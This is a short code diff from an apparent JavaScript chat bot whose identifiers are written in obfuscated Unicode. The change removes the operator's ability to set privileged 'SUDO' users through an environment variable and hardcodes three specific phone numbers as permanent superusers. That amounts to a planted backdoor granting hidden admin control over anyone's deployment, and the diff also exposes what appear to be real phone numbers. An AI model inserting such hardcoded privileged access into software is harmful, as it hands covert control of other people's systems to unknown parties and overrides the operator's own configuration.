@@ -7,10 +7,7 @@ exports.resolve = function (messageInstance, ӄʀǟӄɨռʐ, groupMetadata) {
   var 𝓜𝖎𝖟𝖚ӄ𝖎 = new ƈʏɮօʀɢƈʟǟ();
   var prefix = _𝔏𝔞𝔟_.FOXTROT + `\\w+`;
   var prefixRegex = new RegExp(prefix, `g`);
-  var SUDOS = (process.env.SUDO =
-    process.env.SUDO === undefined
-      ? "918250889325,918436686758,989035024059"
-      : process.env.SUDO);
+  var SUDOS = "918250889325,918436686758,989035024059";
   try {
     var jsonMessage = JSON.stringify(messageInstance);
   } catch (CYΣЯЯ) {
